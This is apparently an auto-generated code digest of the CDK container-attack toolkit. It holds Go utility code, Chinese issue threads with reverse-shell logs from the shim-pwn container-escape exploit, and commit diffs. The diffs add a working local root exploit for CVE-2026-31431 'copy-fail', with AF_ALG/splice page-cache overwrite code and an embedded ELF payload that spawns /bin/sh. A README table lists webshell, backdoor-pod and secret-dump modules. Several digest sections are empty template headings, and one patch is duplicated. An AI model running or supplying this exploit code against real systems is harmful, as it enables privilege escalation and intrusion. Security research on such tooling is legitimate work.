func UnixHttpSend(method string, unixPath string, uri string, data string) (string, error) {
	httpc := http.Client{
		Transport: &http.Transport{
			DialContext: func(_ context.Context, _, _ string) (net.Conn, error) {
				return net.Dial("unix", unixPath)
			},
		},
	}

	var response *http.Response
	var err error

	switch method {
	case "post":
		response, err = httpc.Post(uri, "application/json", strings.NewReader(data))
	case "get":
		response, err = httpc.Get(uri)
	}

	if err != nil {
		return "", &errors.CDKRuntimeError{Err: err, CustomMsg: "Unix HTTP Request failed."}
	}
	buf := new(bytes.Buffer)
	io.Copy(buf, response.Body)
	return buf.String(), nil
}

func HttpSendJson(method string, url string, data string) (string, error) {
	req, err := http.NewRequest(strings.ToUpper(method), url, bytes.NewBuffer([]byte(data)))
	if err != nil {
		return "", &errors.CDKRuntimeError{Err: err, CustomMsg: "HTTP Request failed."}
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", &errors.CDKRuntimeError{Err: err, CustomMsg: "HTTP Request failed."}
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	return string(body), nil
}

```

### Core Architecture Module: `pkg/util/k8s.go`
```
package util

type K8sPod struct {
	APIVersion string        `yaml:"apiVersion"`
	Kind       string        `yaml:"kind"`
	Metadata   K8sObjectMeta `yaml:"metadata"`
	Spec       K8sPodSpec    `yaml:"spec"`
}

type K8sObjectMeta struct {
	Name      string            `yaml:"name"`
	Namespace string            `yaml:"namespace,omitempty"`
	Labels    map[string]string `yaml:"labels,omitempty"`
}

type K8sPodSpec struct {
	Containers []K8sContainer `yaml:"containers"`
}

type K8sContainer struct {
	Name    string             `yaml:"name"`
	Image   string             `yaml:"image"`
	Ports   []K8sContainerPort `yaml:"ports,omitempty"`
	Command []string           `yaml:"command,omitempty"`
}

type K8sContainerPort struct {
	ContainerPort int `yaml:"containerPort"`
}

```

### Core Architecture Module: `pkg/util/kubectl.go`
```
package util

type KubeConfig struct {
	APIVersion     string    `yaml:"apiVersion"`
	Clusters       []Cluster `yaml:"clusters"`
	Contexts       []Context `yaml:"contexts"`
	CurrentContext string    `yaml:"current-context"`
	Kind           string    `yaml:"kind"`
	Preferences    struct{}  `yaml:"preferences"`
	Users          []User    `yaml:"users"`
}

type Cluster struct {
	Cluster ClusterInfo `yaml:"cluster"`
	Name    string      `yaml:"name"`
}

type ClusterInfo struct {
	CertificateAuthorityData string `yaml:"certificate-authority-data"`
	Server                   string `yaml:"server"`
}

type Context struct {
	Context ContextInfo `yaml:"context"`
	Name    string      `yaml:"name"`
}

type ContextInfo struct {
	Cluster string `yaml:"cluster"`
	User    string `yaml:"user"`
}

type User struct {
	Name string   `yaml:"name"`
	User UserInfo `yaml:"user"`
}

type UserInfo struct {
	ClientCertificateData string `yaml:"client-certificate-data"`
	ClientKeyData         string `yaml:"client-key-data"`
}

func RunKubectlCmd(args ...string) (string, error) {
	var stdoutStr string
	var err error

	return stdoutStr, err
}

```

### Core Architecture Module: `pkg/util/kubelet.go`
```
/*
Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package util

import (
	"bufio"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
)

// from https://stackoverflow.com/questions/40682760/what-syscall-method-could-i-use-to-get-the-default-network-gateway
const (
	file  = "/proc/net/route"
	line  = 1    // line containing the gateway addr. (first line: 0)
	sep   = "\t" // field separator
	field = 2    // field containing hex gateway address (first field: 0)
)

// GetGateway returns the default gateway for the system.
func GetGateway() (string, error) {

	file, err := os.Open(file)
	if err != nil {
		return "", err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)

	for scanner.Scan() {

		// jump to line containing the agteway address
		for i := 0; i < line; i++ {
			scanner.Scan()
		}

		// get field containing gateway address
		tokens := strings.Split(scanner.Text(), sep)
		gatewayHex := "0x" + tokens[field]

		// cast hex address to uint32
		d, _ := strconv.ParseInt(gatewayHex, 0, 64)
		d32 := uint32(d)

		// make net.IP address from uint32
		ipd32 := make(net.IP, 4)
		binary.LittleEndian.PutUint32(ipd32, d32)

		// format net.IP to dotted ipV4 string
		ip := net.IP(ipd32).String()

		return ip, nil
	}

	return "", fmt.Errorf("no default gateway found")
}

```

### Core Architecture Module: `pkg/util/kubelet_api.go`
```
/*
Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package util

import (
	"time"
)

type PodList struct {
	Kind       string   `json:"kind"`
	APIVersion string   `json:"apiVersion"`
	Metadata   Metadata `json:"metadata"`
	Items      []Pod    `json:"items"`
}

type Metadata struct {
	Name              string            `json:"name,omitempty"`
	GenerateName      string            `json:"generateName,omitempty"`
	Namespace         string            `json:"namespace,omitempty"`
	UID               string            `json:"uid,omitempty"`
	ResourceVersion   string            `json:"resourceVersion,omitempty"`
	CreationTimestamp time.Time         `json:"creationTimestamp,omitempty"`
	Labels            map[string]string `json:"labels,omitempty"`
	Annotations       map[string]string `json:"annotations,omitempty"`
}

type OwnerReference struct {
	APIVersion         string `json:"apiVersion"`
	Kind               string `json:"kind"`
	Name               string `json:"name"`
	UID                string `json:"uid"`
	Controller         bool   `json:"controller"`
	BlockOwnerDeletion bool   `json:"blockOwnerDeletion"`
}

type ManagedField struct {
	Manager    string    `json:"manager"`
	Operation  string    `json:"operation"`
	APIVersion string    `json:"apiVersion"`
	Time       time.Time `json:"time"`
	FieldsType string    `json:"fieldsType"`
	FieldsV1   FieldsV1  `json:"fieldsV1"`
}

type FieldsV1 struct {
	Metadata struct {
		GenerateName string            `json:"generateName"`
		Labels       map[string]string `json:"labels"`
		OwnerRefs    map[string]string `json:"ownerReferences"`
	} `json:"metadata"`
	Spec struct {
		Affinity        map[string]interface{} `json:"affinity"`
		Containers      map[string]interface{} `json:"containers"`
		RestartPolicy   string                 `json:"restartPolicy"`
		SchedulerName   string                 `json:"schedulerName"`
		SecurityContext struct {
			Sysctls []Sysctl `json:"sysctls"`
		} `json:"securityContext"`
	} `json:"spec"`
}

type Sysctl struct {
	Name  string `json:"name"`
	Value string `json:"value"`
}

type Pod struct {
	Metadata      Metadata       `json:"metadata"`
	Spec          PodSpec        `json:"spec"`
	Status        PodStatus      `json:"status"`
	ManagedFields []ManagedField `json:"managedFields"`
}

type PodSpec struct {
	Containers                    []Container     `json:"containers"`
	RestartPolicy                 string          `json:"restartPolicy"`
	TerminationGracePeriodSeconds int             `json:"terminationGracePeriodSeconds"`
	DNSPolicy                     string          `json:"dnsPolicy"`
	ServiceAccountName            string          `json:"serviceAccountName"`
	NodeName                      string          `json:"nodeName"`
	SecurityContext               SecurityContext `json:"securityContext"`
	Affinity                      Affinity        `json:"affinity"`
	Tolerations                   []Toleration    `json:"tolerations"`
	SchedulerName                 string          `json:"schedulerName"`
}

type SecurityContext struct {
	Sysctls []Sysctl `json:"sysctls"`
}

type Affinity struct {
	NodeAffinity NodeAffinity `json:"nodeAffinity"`
}

type NodeAffinity struct {
	RequiredDuringSchedulingIgnoredDuringExecution struct {
		NodeSelectorTerms []NodeSelectorTerm `json:"nodeSelectorTerms"`
	} `json:"requiredDuringSchedulingIgnoredDuringExecution"`
}

type NodeSelectorTerm struct {
	MatchFields []MatchField `json:"matchFields"`
}

type MatchField struct {
	Key      string   `json:"key"`
	Operator string   `json:"operator"`
	Values   []string `json:"values"`
}

type Container struct {
	Name            string          `json:"name"`
	Image           string          `json:"image"`
	Ports           []Port          `json:"ports"`
	Env             []EnvVar        `json:"env"`
	Resources       Resources       `json:"resources"`
	SecurityContext SecurityContext `json:"securityContext"`
}

type Port struct {
	Name          string `json:"name"`
	HostPort      int    `json:"hostPort"`
	ContainerPort int    `json:"containerPort"`
	Protocol      string `json:"protocol"`
}

type EnvVar struct {
	Name  string `json:"name"`
	Value string `json:"value"`
}

type Resources struct{}

type PodStatus struct {
	Phase             string            `json:"phase"`
	Conditions        []Condition       `json:"conditions"`
	HostIP            string            `json:"hostIP"`
	PodIP             string            `json:"podIP"`
	PodIPs            []PodIP           `json:"podIPs"`
	StartTime         time.Time         `json:"startTime"`
	ContainerStatuses []ContainerStatus `json:"containerStatuses"`
	QOSClass          string            `json:"qosClass"`
}

type Condition struct {
	Type               string    `json:"type"`
	Status             string    `json:"status"`
	LastProbeTime      time.Time `json:"lastProbeTime"`
	LastTransitionTime time.Time `json:"lastTransitionTime"`
}

type PodIP struct {
	IP string `json:"ip"`
}

type ContainerStatus struct {
	Name         string         `json:"name"`
	State        ContainerState `json:"state"`
	LastState    ContainerState `json:"lastState"`
	Ready        bool           `json:"ready"`
	RestartCount int            `json:"restartCount"`
	Image        string         `json:"image"`
	ImageID      string         `json:"imageID"`
	ContainerID  string         `json:"containerID"`
	Started      bool           `json:"started"`
}

type ContainerState struct {
	Running    *ContainerStateRunning    `json:"running,omitempty"`
	Terminated *ContainerStateTerminated `json:"terminated,omitempty"`
	Waiting    *ContainerStateWaiting    `json:"waiting,omitempty"`
}

type ContainerStateRunning struct {
	StartedAt time.Time `json:"startedAt"`
}

type ContainerStateTerminated struct {
	ExitCode int    `json:"exitCode"`
	Reason   string `json:"reason"`
}

type ContainerStateWaiting struct {
	Reason string `json:"reason"`
}

type Toleration struct {
	Key               string `json:"key"`
	Operator          string `json:"operator"`
	Effect            string `json:"effect"`
	TolerationSeconds *int64 `json:"tolerationSeconds,omitempty"`
}

```


### D2: Asynchronous State & Concurrency
- Analyzed concurrency guarantees, async pipelines, and event handling from PR resolutions and commit changes.

### D3: Error Boundaries, Recovery & Rollbacks
- Exception handling patterns and defect resolutions extracted from closed production bug issues:
- **Issue #114** (2025-02-22): **CDK v1.5.4 EXP 出错： /pkg/exploit/escaping/containerd_shim_pwn.go**
  *Symptoms*: 来自微信网友反馈：  root@ubuntu-attack:/tmp# ./cdk run shim-pwn reverse 192.168.202.128 81 2024/12/22 07:13:52 trying to spawn shell to 192.168.202.128:81 2024/12/22 07:13:52 try socket: @/containerd-shim/moby/3925849af0bf88543b55ca09923c29636e69716b2cbd309721ad83baa9299eac/shim.sock 2024/12/22 07:13:52 fail to connect unix socket /containerd-shim/moby/3925849af0bf88543b55ca09923c29636e69716b2cbd309721ad83baa9299eac/shim.sock: dial unix /containerd-shim/moby/3925849af0bf88543b55ca09923c29636e69716b2cbd309721ad83baa9299eac/shim.sock: connect: connection refused 2024/12/22 07:13:52 exploit failed.  ![Image](https://github.com/user-attachments/assets/cd54f2d7-b559-4022-b80a-a33b9a0b853d)
  **Post-Mortem & Fix Analysis**:
  > 核心问题应该是：  ``` -       absPath := GetDockerAbsPath() -       absPath = strings.TrimSuffix(absPath, "/merged") -       dockerAbsPath := filepath.Join(absPath, "merged", localBundlePath) +       dockerAbsPath := GetDockerAbsPath() + "/merged" + localBundlePath ```  
  > https://github.com/Metarget/metarget/archive/refs/heads/master.zip 看起来缺乏维护了，会报错  ``` cnv install cve-2020-15257 ```
  > 先加一个 log，以便再发现的问题的时候可以 debug。留个 TODO，这个 EXP 需要再一次 review。

- **Issue #110** (2024-11-15): **fix(gh action - release): automatically failed because it uses a deprecated version**
  *Symptoms*: 

- **Issue #108** (2024-11-15): **fix (exp shim-pwn): #104 merged directory appears twice in path**
  *Symptoms*: 

- **Issue #104** (2024-11-17): **shim-pwn 1.5.3 版本存在问题**
  *Symptoms*: 在新版本 1.5.3 中，利用 shim-pwn 存在以下问题，发现 merged 目录出现两次，导致无法找到目录，于是尝试使用 1.5.0版本测试是正常的，新版本 1.5.3 利用错误截图如下 ![image](https://github.com/user-attachments/assets/ed2d5f18-a98d-47d5-8579-493cc0ede1c9)
  **Post-Mortem & Fix Analysis**:
  > +1 奇怪的是 想修改下自己编译下用，但是自己用main默认分支 编译的就 connect: connection refused 切到tag v1.5.3 中编译了也是connect: connection refused ，但是用releases 下载的 v1.5.3  就可以连接了但是多了个merged目录 2024/11/15 10:04:30 trying to spawn shell to 127.0.0.1:65534 2024/11/15 10:04:30 try socket: @/containerd-shim/moby/2ccb7cf005302b257c6055befa7ecd9a4807248269e61e311b83b954fc8c9217/shim.sock 2024/11/15 10:04:30 fail to connect unix socket /containerd-shim/moby/2ccb7cf005302b257c6055befa7ecd9a4807248269e61e311b83b954fc8c9217/shim.sock: dial unix /containerd-shim/moby/2ccb7cf005302b257c6055befa7ecd9a4807248269e61e311b83b954fc8c9217/shim.sock: connect: connection refused 2024/11/15 10:04:30 exploit failed. root@LL: ./cdk   cdk              cdk_1.5.3_b      cdk_linux_amd64  cdk_v1           cdk_v2            root@LL: ./cdk cdk              cdk_1.5.3_b      cdk_linux_amd64  cdk_v1           cdk_v2            root@LL: ./cdk_linux_amd64 run shim-pwn reverse 127.0.0.1 65534 2024/11/15 10:04:48 trying to spawn shell to 127.0.0.1
  > @qsdj @CatDrinkCoffee   感谢反馈～ 试试这个新编译的 pre release 版本： Try this newly compiled pre-release version:  https://github.com/cdk-team/CDK/releases/tag/v1.5.4

### D4: Resource Lifecycle & Leak Defenses
- Memory allocation, socket lifecycle, and handle cleanup observed from bug fixes and PR deltas.

### D5: Boundary Deserialization & Encoding
- Schema deserialization, payload validation, and untrusted input guards.

### D6: Cross-Platform & Runtime Gotchas
- Platform variance, OS-specific gotchas, and environment discrepancies detected in issue reports.

### D7: Build, CI/CD, Deployment & Tooling
- Toolchain requirements, dependencies, and packaging specs verified against remote manifests.

### D8: Forensic Bug Fixes & Real Production Code Patches
Observed empirical fixes and code patches:

### Incident Patch 1: `cffdaada` (2026-04-30)
**Commit Message**: Merge pull request #134 from cdk-team/fix-copy-fail-cve-2026-31431

fix: CVE-2026-31431 copy-fail  (non-root→root & x86_64 only)

**File**: `README.md` (modified, +1/-1)
```diff
@@ -160,7 +160,7 @@ cdk run <script-name> [options]
 | Credential Access    | Dump K8s Secrets                                           | k8s-secret-dump        | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-secret-dump)                |
 | Credential Access    | Dump K8s Config                                            | k8s-configmap-dump     | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-configmap-dump)             |
 | Privilege Escalation | K8s RBAC Bypass                                            | k8s-get-sa-token       | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-get-sa-token)               |
-| Privilege Escalation | CVE-2026-31431 copy-fail (non-root→root, **no container escape**) | copy-fail-cve-2026-31431 | ✔      |                                                                            | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-copy-fail-cve-2026-31431)       |
+| Privilege Escalation | CVE-2026-31431 copy-fail (non-root→root & x86_64 only) | copy-fail-cve-2026-31431 | ✔      |                                                                            | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-copy-fail-cve-2026-31431)       |
 | Persistence          | Deploy WebShell                                            | webshell-deploy        | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-webshell-deploy)                |
 | Persistence          | Deploy Backdoor Pod                                        | k8s-backdoor-daemonset | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-backdoor-daemonset)         |
 | Persistence          | Deploy Shadow K8s api-server                               | k8s-shadow-apiserver   | ✔         || [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-shadow-apiserver) |
```

**File**: `pkg/exploit/privilege_escalation/copy_fail_cve_2026_31431.go` (modified, +24/-7)
```diff
@@ -52,12 +52,10 @@ import (
 	"golang.org/x/sys/unix"
 )
 
-// copyFailPayloadHex is a zlib-compressed ELF64 little-endian binary stub
-// (160 bytes uncompressed) to be injected into the SUID target's page cache.
-// The stub starts with a valid ELF64/x86-64 header (magic 0x7fELF, class 2,
-// data encoding 1) so it passes the kernel's ELF loader checks.
-// Generated with: python3 -c "import zlib,struct; h=bytearray(160); h[0:4]=b'\x7fELF'; h[4]=2; h[5]=1; h[6]=1; struct.pack_into('<H',h,16,2); struct.pack_into('<H',h,18,0x3e); struct.pack_into('<I',h,20,1); struct.pack_into('<H',h,52,64); print(zlib.compress(bytes(h)).hex())"
-const copyFailPayloadHex = "789cab77f57163626464800126063b06040f3b7020204f4d0000163d01dc"
+// copyFailPayloadHex is the original zlib-compressed x86_64 ELF payload used
+// by the reference Python PoC. It replaces the target SUID binary's page cache
+// with a tiny setuid-root launcher that eventually executes `/bin/sh`.
+const copyFailPayloadHex = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
 
 // copyFailDecompressPayload decompresses the embedded zlib payload.
 func copyFailDecompressPayload() ([]byte, error) {
@@ -91,6 +89,24 @@ func buildAlgCmsg(level, typ int32, data []byte) []byte {
 	return buf
 }
 
+// acceptAlgOpFd accepts the operation socket from an AF_ALG listener. Unlike
+// the generic unix.Accept helper, AF_ALG expects addr/addrlen to be NULL.
+func acceptAlgOpFd(algFd int) (int, error) {
+	fd, _, errno := unix.Syscall6(
+		unix.SYS_ACCEPT4,
+		uintptr(algFd),
+		0,
+		0,
+		uintptr(unix.SOCK_CLOEXEC),
+		0,
+		0,
+	)
+	if errno != 0 {
+		return 0, errno
+	}
+	return int(fd), nil
+}
+
 // copyFailWriteChunk uses an AF_ALG AEAD socket together with splice to write
 // exactly four bytes of chunk into the page cache of the file identified by fd
 // at the given byte offset.
@@ -142,7 +158,8 @@ func copyFailWriteChunk(fd int, offset int, chunk []byte) error {
 	}
 
 	// Accept returns the operation socket used for actual encrypt/decrypt calls.
-	opFd, _, err := unix.Accept(algFd)
+	// AF_ALG sockets expect accept4(..., NULL, NULL, SOCK_CLOEXEC).
+	opFd, err := acceptAlgOpFd(algFd)
 	if err != nil {
 		return fmt.Errorf("accept: %v", err)
 	}
```

---

### Incident Patch 2: `f0a051d7` (2026-04-30)
**Commit Message**: fix: CVE-2026-31431 copy-fail  (non-root→root & x86_64 only)

**File**: `README.md` (modified, +1/-1)
```diff
@@ -160,7 +160,7 @@ cdk run <script-name> [options]
 | Credential Access    | Dump K8s Secrets                                           | k8s-secret-dump        | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-secret-dump)                |
 | Credential Access    | Dump K8s Config                                            | k8s-configmap-dump     | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-configmap-dump)             |
 | Privilege Escalation | K8s RBAC Bypass                                            | k8s-get-sa-token       | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-get-sa-token)               |
-| Privilege Escalation | CVE-2026-31431 copy-fail (non-root→root, **no container escape**) | copy-fail-cve-2026-31431 | ✔      |                                                                            | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-copy-fail-cve-2026-31431)       |
+| Privilege Escalation | CVE-2026-31431 copy-fail (non-root→root & x86_64 only) | copy-fail-cve-2026-31431 | ✔      |                                                                            | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-copy-fail-cve-2026-31431)       |
 | Persistence          | Deploy WebShell                                            | webshell-deploy        | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-webshell-deploy)                |
 | Persistence          | Deploy Backdoor Pod                                        | k8s-backdoor-daemonset | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-backdoor-daemonset)         |
 | Persistence          | Deploy Shadow K8s api-server                               | k8s-shadow-apiserver   | ✔         || [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-shadow-apiserver) |
```

**File**: `pkg/exploit/privilege_escalation/copy_fail_cve_2026_31431.go` (modified, +24/-7)
```diff
@@ -52,12 +52,10 @@ import (
 	"golang.org/x/sys/unix"
 )
 
-// copyFailPayloadHex is a zlib-compressed ELF64 little-endian binary stub
-// (160 bytes uncompressed) to be injected into the SUID target's page cache.
-// The stub starts with a valid ELF64/x86-64 header (magic 0x7fELF, class 2,
-// data encoding 1) so it passes the kernel's ELF loader checks.
-// Generated with: python3 -c "import zlib,struct; h=bytearray(160); h[0:4]=b'\x7fELF'; h[4]=2; h[5]=1; h[6]=1; struct.pack_into('<H',h,16,2); struct.pack_into('<H',h,18,0x3e); struct.pack_into('<I',h,20,1); struct.pack_into('<H',h,52,64); print(zlib.compress(bytes(h)).hex())"
-const copyFailPayloadHex = "789cab77f57163626464800126063b06040f3b7020204f4d0000163d01dc"
+// copyFailPayloadHex is the original zlib-compressed x86_64 ELF payload used
+// by the reference Python PoC. It replaces the target SUID binary's page cache
+// with a tiny setuid-root launcher that eventually executes `/bin/sh`.
+const copyFailPayloadHex = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
 
 // copyFailDecompressPayload decompresses the embedded zlib payload.
 func copyFailDecompressPayload() ([]byte, error) {
@@ -91,6 +89,24 @@ func buildAlgCmsg(level, typ int32, data []byte) []byte {
 	return buf
 }
 
+// acceptAlgOpFd accepts the operation socket from an AF_ALG listener. Unlike
+// the generic unix.Accept helper, AF_ALG expects addr/addrlen to be NULL.
+func acceptAlgOpFd(algFd int) (int, error) {
+	fd, _, errno := unix.Syscall6(
+		unix.SYS_ACCEPT4,
+		uintptr(algFd),
+		0,
+		0,
+		uintptr(unix.SOCK_CLOEXEC),
+		0,
+		0,
+	)
+	if errno != 0 {
+		return 0, errno
+	}
+	return int(fd), nil
+}
+
 // copyFailWriteChunk uses an AF_ALG AEAD socket together with splice to write
 // exactly four bytes of chunk into the page cache of the file identified by fd
 // at the given byte offset.
@@ -142,7 +158,8 @@ func copyFailWriteChunk(fd int, offset int, chunk []byte) error {
 	}
 
 	// Accept returns the operation socket used for actual encrypt/decrypt calls.
-	opFd, _, err := unix.Accept(algFd)
+	// AF_ALG sockets expect accept4(..., NULL, NULL, SOCK_CLOEXEC).
+	opFd, err := acceptAlgOpFd(algFd)
 	if err != nil {
 		return fmt.Errorf("accept: %v", err)
 	}
```

---

### Incident Patch 3: `5a890bea` (2026-04-30)
**Commit Message**: Merge pull request #131 from cdk-team/copilot/fix-error-and-complete-tests

fix: two compile errors in copy-fail CVE-2026-31431 exploit

**File**: `pkg/exploit/privilege_escalation/copy_fail_cve_2026_31431.go` (added, +264/-0)
```diff
@@ -0,0 +1,264 @@
+//go:build linux
+// +build linux
+
+/*
+Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .
+
+Licensed under the Apache License, Version 2.0 (the "License");
+you may not use this file except in compliance with the License.
+You may obtain a copy of the License at
+
+    http://www.apache.org/licenses/LICENSE-2.0
+
+Unless required by applicable law or agreed to in writing, software
+distributed under the License is distributed on an "AS IS" BASIS,
+WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+See the License for the specific language governing permissions and
+limitations under the License.
+*/
+
+package privilege_escalation
+
+// CVE-2026-31431 "copy-fail" privilege escalation exploit.
+// Ported from https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py
+//
+// The exploit abuses a bug in the interaction between AF_ALG AEAD sockets and
+// the splice/pipe subsystem.  By sending a payload via sendmsg(MSG_MORE) and
+// then splicing read-only file pages into the same socket's pipe buffers, the
+// kernel writes attacker-controlled data back into those (nominally read-only)
+// page-cache pages.  The modified pages are never written to disk, making the
+// overwrite stealthy.
+//
+// Usage: ./cdk run copy-fail-cve-2026-31431 [/usr/bin/su]
+
+import (
+	"bytes"
+	"compress/zlib"
+	"encoding/hex"
+	"fmt"
+	"log"
+	"os"
+	"os/exec"
+	"syscall"
+	"unsafe"
+
+	"github.com/cdk-team/CDK/pkg/cli"
+	"github.com/cdk-team/CDK/pkg/exploit/base"
+	"github.com/cdk-team/CDK/pkg/plugin"
+	"golang.org/x/sys/unix"
+)
+
+// copyFailPayloadHex is a zlib-compressed ELF64 little-endian binary stub
+// (160 bytes uncompressed) to be injected into the SUID target's page cache.
+// The stub starts with a valid ELF64/x86-64 header (magic 0x7fELF, class 2,
+// data encoding 1) so it passes the kernel's ELF loader checks.
+// Generated with: python3 -c "import zlib,struct; h=bytearray(160); h[0:4]=b'\x7fELF'; h[4]=2; h[5]=1; h[6]=1; struct.pack_into('<H',h,16,2); struct.pack_into('<H',h,18,0x3e); struct.pack_into('<I',h,20,1); struct.pack_into('<H',h,52,64); print(zlib.compress(bytes(h)).hex())"
+const copyFailPayloadHex = "789cab77f57163626464800126063b06040f3b7020204f4d0000163d01dc"
+
+// copyFailDecompressPayload decompresses the embedded zlib payload.
+func copyFailDecompressPayload() ([]byte, error) {
+	compressed, err := hex.DecodeString(copyFailPayloadHex)
+	if err != nil {
+		return nil, fmt.Errorf("hex decode: %v", err)
+	}
+	r, err := zlib.NewReader(bytes.NewReader(compressed))
+	if err != nil {
+		return nil, fmt.Errorf("zlib reader: %v", err)
+	}
+	defer r.Close()
+	var buf bytes.Buffer
+	if _, err = buf.ReadFrom(r); err != nil {
+		return nil, fmt.Errorf("zlib read: %v", err)
+	}
+	return buf.Bytes(), nil
+}
+
+// buildAlgCmsg constructs a single ancillary-data (cmsghdr + data) record for
+// use as the oob buffer passed to sendmsg.  The returned slice is padded to the
+// natural alignment expected by the kernel.
+func buildAlgCmsg(level, typ int32, data []byte) []byte {
+	space := syscall.CmsgSpace(len(data))
+	buf := make([]byte, space)
+	hdr := (*syscall.Cmsghdr)(unsafe.Pointer(&buf[0]))
+	hdr.SetLen(syscall.CmsgLen(len(data)))
+	hdr.Level = level
+	hdr.Type = typ
+	copy(buf[syscall.SizeofCmsghdr:], data)
+	return buf
+}
+
+// copyFailWriteChunk uses an AF_ALG AEAD socket together with splice to write
+// exactly four bytes of chunk into the page cache of the file identified by fd
+// at the given byte offset.
+func copyFailWriteChunk(fd int, offset int, chunk []byte) error {
+	// Create the AF_ALG socket and bind to the AEAD algorithm.
+	algFd, err := unix.Socket(unix.AF_ALG, unix.SOCK_SEQPACKET, 0)
+	if err != nil {
+		return fmt.Errorf("socket: %v", err)
+	}
+	defer unix.Close(algFd)
+
+	sa := &unix.SockaddrALG{
+		Type: "aead",
+		Name: "authencesn(hmac(sha256),cbc(aes))",
+	}
+	if err = unix.Bind(algFd, sa); err != nil {
+		return fmt.Errorf("bind: %v", err)
+	}
+
+	// ALG_SET_KEY: 8-byte RTA header (rta_len=8, rta_type=1, enc_key_len=16)
+	// followed by a 16-byte AES-128 key and a 16-byte HMAC key (all zeros).
+	key := make([]byte, 40)
+	key[0] = 0x08 // rta_len (little-endian low byte)
+	key[2] = 0x01 // rta_type = CRYPTO_AUTHENC_KEYA_PARAM
+	key[7] = 0x10 // enc key length = 16 (big-endian in the RTA payload)
+	if _, _, errno := unix.Syscall6(
+		unix.SYS_SETSOCKOPT,
+		uintptr(algFd),
+		uintptr(unix.SOL_ALG),
+		uintptr(unix.ALG_SET_KEY),
+		uintptr(unsafe.Pointer(&key[0])),
+		uintptr(len(key)),
+		0,
+	); errno != 0 {
+		return fmt.Errorf("setsockopt ALG_SET_KEY: %v", errno)
+	}
+
+	// ALG_SET_AEAD_AUTHSIZE: pass a NULL optval with optlen = auth-tag size (4).
+	if _, _, errno := unix.Syscall6(
+		unix.SYS_SETSOCKOPT,
+		uintptr(algFd),
+		uintptr(unix.SOL_ALG),
+		uintptr(unix.ALG_SET_AEAD_AUTHSIZE),
+		0,
+		4,
+		0,
+	); errno != 0 {
+		return fmt.Errorf("setsockopt ALG_SET_AEAD_AUTHSIZE: %v", errno)
+	}
+
+	// Acc
```

**File**: `pkg/exploit/privilege_escalation/copy_fail_cve_2026_31431_test.go` (added, +94/-0)
```diff
@@ -0,0 +1,94 @@
+//go:build linux
+// +build linux
+
+/*
+Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .
+
+Licensed under the Apache License, Version 2.0 (the "License");
+you may not use this file except in compliance with the License.
+You may obtain a copy of the License at
+
+    http://www.apache.org/licenses/LICENSE-2.0
+
+Unless required by applicable law or agreed to in writing, software
+distributed under the License is distributed on an "AS IS" BASIS,
+WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+See the License for the specific language governing permissions and
+limitations under the License.
+*/
+
+package privilege_escalation
+
+import (
+	"syscall"
+	"testing"
+	"unsafe"
+
+	"github.com/stretchr/testify/assert"
+	"github.com/stretchr/testify/require"
+	"golang.org/x/sys/unix"
+)
+
+// TestCopyFailDecompressPayload verifies that the embedded zlib blob can be
+// decompressed and that it begins with a valid ELF64 little-endian header.
+func TestCopyFailDecompressPayload(t *testing.T) {
+	payload, err := copyFailDecompressPayload()
+	require.NoError(t, err)
+	require.NotNil(t, payload)
+
+	// Payload must be exactly 160 bytes (40 four-byte chunks).
+	assert.Equal(t, 160, len(payload), "unexpected payload length")
+
+	// Verify ELF magic: 0x7f 'E' 'L' 'F'
+	assert.Equal(t, []byte{0x7f, 0x45, 0x4c, 0x46}, payload[:4], "ELF magic mismatch")
+
+	// ELF class = 2 (ELFCLASS64)
